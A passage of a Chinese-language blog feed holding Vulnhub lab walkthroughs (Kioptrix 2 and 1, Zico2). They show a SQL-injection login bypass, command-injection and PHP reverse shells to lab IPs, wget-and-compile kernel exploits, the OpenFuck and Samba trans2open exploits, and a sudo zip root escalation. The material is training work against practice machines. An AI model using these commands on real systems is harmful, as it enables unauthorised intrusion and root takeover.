RTT     ADDRESS</span><br><span class="line">1   0.47 ms 192.168.43.47</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds</span><br></pre></td></tr></table></figure>
<h2><span id="漏洞利用">漏洞利用</span></h2><p>存在<code>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</code>端口</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_1.png" alt=""></p>
<p>尝试万能密码<code>&#39; or 1=1#</code> ，成功登录。</p>
<p>可以看到一个执行ping命令的框框。</p>
<p>可见是一个命令执行漏洞。</p>
<p>在命令执行中是有<code>| &amp;&amp; || ;</code>这些常见的符号的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# whoai||id			//如果||左边的命令（命令1）未执行成功，那么就执行||右边的命令（命令2）；</span><br><span class="line">bash: whoai: 未找到命令</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)	</span><br><span class="line">root@kali:~# whoami|id			//执行后一个命令</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami;id			//按顺序执行</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br><span class="line">root@kali:~# whoami&amp;&amp;id			//&amp;&amp;左边的命令（命令1）返回真(即返回0，成功被执行）后，&amp;&amp;右边的命令（命令2）才能够被执行</span><br><span class="line">root</span><br><span class="line">uid=0(root) gid=0(root) 组=0(root)</span><br></pre></td></tr></table></figure>
<p>这里我们可以利用<code>| ;</code>进行命令执行</p>
<p>测试<code>cat /etc/passwd</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_2.png" alt=""></p>
<p>下面用命令执行一个交互shell.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;bash -i &gt;&amp; /dev/tcp/192.168.43.177/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>同时用<code>nc</code>监听2333端口。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3.png" alt=""></p>
<p>得到一个交互shell。但是权限是<code>apache</code>用户。</p>
<h2><span id="权限提升">权限提升</span></h2><p>当前的权限是<code>apache</code>用户,我们需要对他进行提权得到<code>root</code>权限。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ uname -a</span><br><span class="line">Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span><br></pre></td></tr></table></figure>
<p>查看当前系统版本。<code>searchsploit linux 2.6.9</code>查找相关提权漏洞</p>
<p><code>https://www.exploit-db.com/download/9542.c</code></p>
<p>利用到9542.c的exp.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">bash-3.00$ cd /tmp</span><br><span class="line">bash-3.00$ wget http://192.168.43.177/9542.c</span><br><span class="line">--03:06:55--  http://192.168.43.177/9542.c</span><br><span class="line">           =&gt; `9542.c&apos;</span><br><span class="line">Connecting to 192.168.43.177:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 2,645 (2.6K) [text/x-csrc]</span><br><span class="line"></span><br><span class="line">    0K ..                                                    100%  252.25 MB/s</span><br><span class="line"></span><br><span class="line">03:06:55 (252.25 MB/s) - `9542.c&apos; saved [2645/2645]</span><br><span class="line"></span><br><span class="line">bash-3.00$ gcc -o 9542 9542.c</span><br><span class="line">bash-3.00$ ./9542</span><br><span class="line">sh: no job control in this shell</span><br><span class="line">sh-3.00# id</span><br><span class="line">uid=0(root) gid=0(root) groups=48(apache)</span><br><span class="line">sh-3.00# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>提权成功。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Vulnhub渗透测试练习-Kioptrix 1]]></title>
      <url>https://uknowsec.cn/posts/notes/Vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Kioptrix-1.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="信息收集">信息收集</span></h2><p>通过<code>netdiscover</code>发现目标主机IP地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# netdiscover </span><br><span class="line"></span><br><span class="line"> Currently scanning: 192.168.63.0/16   |   Screen View: Unique Hosts         </span><br><span class="line">                                                                             </span><br><span class="line"> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180             </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.43.1    ac:c1:ee:31:3f:25      1      60  Xiaomi Communications Co L</span><br><span class="line"> 192.168.43.33   44:03:2c:68:d8:0f      1      60  Intel Corporate           </span><br><span class="line"> 192.168.43.54   00:0c:29:7c:3a:16      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure>
<p>从扫描信息的得的目标主机的IP地址为<code>192.168.43.54</code></p>
<p>nmap 扫描IP的端口信息<code>nmap -A 192.168.43.54</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -A -sS 192.168.43.54</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.10 ( https://nmap.org ) at 2018-05-07 15:48 </span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.43.54</span><br><span class="line">Host is up (0.00055s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">| rpcinfo:</span><br><span class="line">|   program version   port/proto  service</span><br><span class="line">|   100000  2            111/tcp  rpcbind</span><br><span class="line">|   100000  2            111/udp  rpcbind</span><br><span class="line">|   100024  1           1024/tcp  status</span><br><span class="line">|_  100024  1           1024/udp  status</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: 2009-09-26T09:32:06</span><br><span class="line">|_Not valid after:  2010-09-26T09:32:06</span><br><span class="line">|_ssl-date: 2018-05-07T07:50:42+00:00; +1m50s from scanner time.</span><br><span class="line">| sslv2:</span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers:</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:7C:3A:16 (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.4</span><br><span class="line">OS details: Linux 2.4.9 - 2.4.18 (likely embedded)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.55 ms 192.168.43.54</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 51.99 seconds</span><br></pre></td></tr></table></figure>
<p><code>443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</code></p>
<p>443端口的服务<code>mod_ssl/2.8.4 OpenSSL/0.9.6b</code></p>
<p>通过<code>searchsploit mod_ssl</code>查询相关漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# searchsploit mod_ssl</span><br><span class="line">--------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                         |  Path</span><br><span class="line">                                       | (/usr/share/exploitdb/)</span><br><span class="line">--------------------------------------- ----------------------------------------</span><br><span class="line">Apache mod_ssl 2.0.x - Remote Denial o | exploits/linux/dos/24590.txt</span><br><span class="line">Apache mod_ssl 2.8.x - Off-by-One HTAc | exploits/multiple/dos/21575.txt</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;Open | exploits/unix/remote/21671.c</span><br><span class="line">Apache mod_ssl &lt; 2.8.7 OpenSSL - &apos;Open | exploits/unix/remote/764.c</span><br><span class="line">Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0. | exploits/unix/remote/40347.txt</span><br><span class="line">--------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
<p>这里可以利用第4个漏洞的exp脚本进行攻击，<code>exploit-db</code>下载相关exp。</p>
<h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="openfuck漏洞利用">OpenFuck漏洞利用</span></h3><p>这是一个远程溢出的漏洞，下载的exp比较久远需要做一些修改。</p>
<ul>
<li>编译需要用的<code>libssl-dev</code>库，且版本为<code>apt-get install libssl1.0-dev</code></li>
<li>在exp中加入头文件<code>&lt;openssl/rc4.h&gt;</code>和<code>&lt;openssl/md5.h&gt;</code></li>
<li>替换exp中的<code>wget</code>后的url为<code>http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</code></li>
<li>第961行,修改为<code>const unsigned char * p，* end;</code></li>
</ul>
<p>然后编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o OpenFuck 764.c -lcrypto</span><br></pre></td></tr></table></figure></p>
<p>运行脚本<code>./OpenFuck</code>选择相应我系统版本</p>
<p>这里选择 0x6b</p>
<p>执行相关的命令<code>./OpenFuck 0x6b 192.168.43.54</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# ./OpenFuck 0x6b 192.168.43.54</span><br><span class="line"></span><br><span class="line">*******************************************************************</span><br><span class="line">* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</span><br><span class="line">*******************************************************************</span><br><span class="line">* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</span><br><span class="line">* #hackarena  irc.brasnet.org                                     *</span><br><span class="line">* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</span><br><span class="line">* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span><br><span class="line">* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span><br><span class="line">*******************************************************************</span><br><span class="line"></span><br><span class="line">Establishing SSL connection</span><br><span class="line">cipher: 0x4043808c   ciphers: 0x80f80e0</span><br><span class="line">Ready to send shellcode</span><br><span class="line">Spawning shell...</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-2.05$ </span><br><span class="line">bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/030exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; </span><br><span class="line">--04:04:37--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&apos;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:80... connected!</span><br><span class="line">HTTP request sent, awaiting response... 301 Moved Permanently</span><br><span class="line">Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]</span><br><span class="line">--04:04:38--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</span><br><span class="line">           =&gt; `ptrace-kmod.c&apos;</span><br><span class="line">Connecting to dl.packetstormsecurity.net:443... connected!</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3,921 [text/x-csrc]</span><br><span class="line"></span><br><span class="line">    0K ...                                                   100% @   3.74 MB/s</span><br><span class="line"></span><br><span class="line">04:04:39 (3.74 MB/s) - `ptrace-kmod.c&apos; saved [3921/3921]</span><br><span class="line"></span><br><span class="line">[+] Attached to 6498</span><br><span class="line">[+] Waiting for signal</span><br><span class="line">[+] Signal caught</span><br><span class="line">[+] Shellcode placed at 0x4001189d</span><br><span class="line">[+] Now wait for suid shell...</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h3><span id="samba漏洞利用">Samba漏洞利用</span></h3><p>实验环境是存在一个samba漏洞的，</p>
<p>这里用到<code>enum4linux</code>其利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。</p>
<p>但我本地环境没有检测到samba的版本</p>
<p>该漏洞为<code>Samba trans2open溢出（Linux x86）</code>在Samba 2.2.0到2.2.8版本中发现的缓冲区溢出.</p>
<p>同样可以在<code>searchsploit</code>查到</p>
<p>这里直接用msf环境进行实验。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(linux/samba/trans2open) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/trans2open):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   RHOST  192.168.43.54   yes       The target address</span><br><span class="line">   RPORT  139              yes       The target port (TCP)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x86/shell_bind_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line">   RHOST  192.168.43.54   no        The target address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Samba 2.2.x - Bruteforce</span><br><span class="line"></span><br><span class="line">msf exploit(linux/samba/trans2open) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started bind handler</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffdfc...</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffcfc...</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffbfc...</span><br><span class="line">[*] 192.168.43.54:139 - Trying return address 0xbffffafc...</span><br><span class="line">[*] Command shell session 2 opened (192.168.43.177:33375 -&gt; 192.168.43.54:4444) at 2018-05-07 04:47:42 -0400</span><br><span class="line"></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=99(nobody)</span><br></pre></td></tr></table></figure>
<h2><span id="总结">总结</span></h2><p>虽然说这个实验环境比较老，一些漏洞可能在现实的实战中是很少存在的。但是在这个漏洞利用的过程中可以学到一些<code>kali linux</code>的工具的利用和一些实战的思路。</p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Vulnhub渗透测试练习 - Zico2]]></title>
      <url>https://uknowsec.cn/posts/notes/vulnhub%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%83%E4%B9%A0-Zico2.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="vulnhub渗透环境">vulnhub渗透环境</span></h2><h3><span id="靶机地址">靶机地址</span></h3><p><a href="https://www.vulnhub.com/entry/zico2-1,210/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/zico2-1,210/</a></p>
<h3><span id="练习环境">练习环境</span></h3><ul>
<li>Kali Linux </li>
<li>VirtualBox</li>
</ul>
<h2><span id="信息收集">信息收集</span></h2><p>在信息收集之前需要获取到靶机的IP地址，我靶机在VirtualBox下是<code>Host-Only</code>网络模式，而靶机是无法直接进入系统看到IP地址的。</p>
<p>这里用到一个kali linux下的一个工具<code>netdiscover</code>基于ARP的网络扫描工具。</p>
<p>直接执行命令<code>netdiscover</code>:</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505223944.png" alt=""></p>
<p>这里我们获取到两个IP地址，测试发现正确的是<code>192.168.56.102</code></p>
<p>接下来用<code>nmap</code>扫描端口信息</p>
<p><code>nmap -A 192.168.56.102</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20180505224409.png" alt=""></p>
<p>得到80端口上运行着一个Web服务器。</p>
<p>访问该Web服务，在这个时候我们可以用常见的扫描工具对网站进行扫描</p>
<h2><span id="漏洞利用">漏洞利用</span></h2><p>这里我简单对页面进行浏览，发现了一个文件包含漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?page=tools.html</span><br></pre></td></tr></table></figure>
<p>尝试包含<code>../../etc/passwd</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_1.png" alt=""></p>
<p>成功包含，解下来就尝试扫描目录，因为校园网的原因，只能用<code>Host-Only</code>网络模式进行测试，所以一切测试过程都在<code>Kali</code>下进行</p>
<p>这里尝试去扫描网站的目录，用到<code>kali</code>下的<code>dirb</code>专门用于爆破目录的工具。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_2.png" alt=""></p>
<p>得到一个<code>dbadmin</code>的目录</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_3.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_4.png" alt=""></p>
<p>这里用到的是一个叫<code>phpLiteAdmin</code>服务器应用，版本号为<code>v1.9.3</code></p>
<p>尝试找找这个版本的历史漏洞，这个服务是存在一个远程PHP代码注入漏洞的。</p>
<p>这里可以通过搜索引擎搜索相关漏洞详情也可以用<code>kali</code>下的<code>Searchsploit</code>一个用于Exploit-DB的命令行搜索工具。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_5.png" alt=""></p>
<p>这样们就可以看到漏洞详情，这里我们可以看到利用这个远程PHP代码注入漏洞需要登录的。</p>
<p>所以尝试默认密码<code>admin</code>，发现可以直接登录进去。</p>
<p>从<code>exploit-db</code>上的资料可以看出，我们需要创建一个数据库，写入一个shell。</p>
<p>这里可以用nc监听端口来反弹shell，也可以用msf生成php目录进行监听。</p>
<p>按照<code>exploit-db</code>所说的建立数据库。这里直接创建一个后缀名为<code>.php</code>的数据库<code>shell</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_6.png" alt=""></p>
<p>并添加表信息</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_7.png" alt=""></p>
<p>这里在本地的<code>/var/www/html</code>目录下创建txt文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $sock=fsockopen(&quot;192.168.56.101&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<p>然后启动apache web服务器</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
<p>然后返回到数据库中添加字段名，类型为<code>TEXT</code>,写入PHP代码来下载执行shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&quot;wget 192.168.56.101/shell.txt -O /tmp/shell.php; php /tmp/shell.php&quot;); ?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_8.png" alt=""></p>
<p>需要让目标下载执行这串恶意代码，需要一个HTTP请求。</p>
<p>这里我们就可以利用到之前发现的本地文件包含的漏洞了。</p>
<p>我们可以在数据库中发现我们恶意创建的数据库的路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/databases/shell.php</span><br></pre></td></tr></table></figure>
<p>先用nc监听我们之前设置的端口<code>2333</code></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_9.png" alt=""></p>
<p>这里我们就可以反弹一个shell了。</p>
<h2><span id="权限提升">权限提升</span></h2><p>在反弹了shell后，对目录进行检查发现了</p>
<p>/home/zico中有一个<code>wordpress</code>目录，是一个常见的CMS</p>
<p>进入查看wp-config.php文件。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_10.png" alt=""></p>
<p>发现了用户zico的登录凭证，我们可以用<code>ssh</code>来连接。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh zico@192.168.56.102</span><br></pre></td></tr></table></figure>
<p>利用<code>sudo -l</code>查看目前用户可执行与无法执行的指令；</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_11.png" alt=""></p>
<p>这里表明当前用户<code>zico</code>可以利用root权限无密码执行<code>tar</code>和<code>zip</code>命令</p>
<p>这里可以利用<code>touch exploit</code>创建一个随机文件，并用<code>zip</code>命令进行压缩</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo zip exploit.zip exploit -T --unzip-command=&quot;python -c &apos;import pty; pty.spawn(\&quot;/bin/sh\&quot;)&apos;&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>sudo 用管理员权限执行</li>
<li>-T 检查文件的完整性。这个参数可以让他执行下一个参数 –unzip-command，在这个参数中写入一个python的交互shell</li>
</ul>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_12.png" alt=""></p>
<p>由此的到<code>root</code>权限，接下来就可以进入<code>/root</code>目录了</p>
<p><code>cat /root/flag.txt</code>得到flag。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/vlunhub_zico2_13.png" alt=""></p>
<h2><span id="总结">总结</span></h2><ul>
<li>vulnhub里面有很多不同的环境提供渗透，第一次完成一次完整的渗透过程，学到了很多东西。</li>
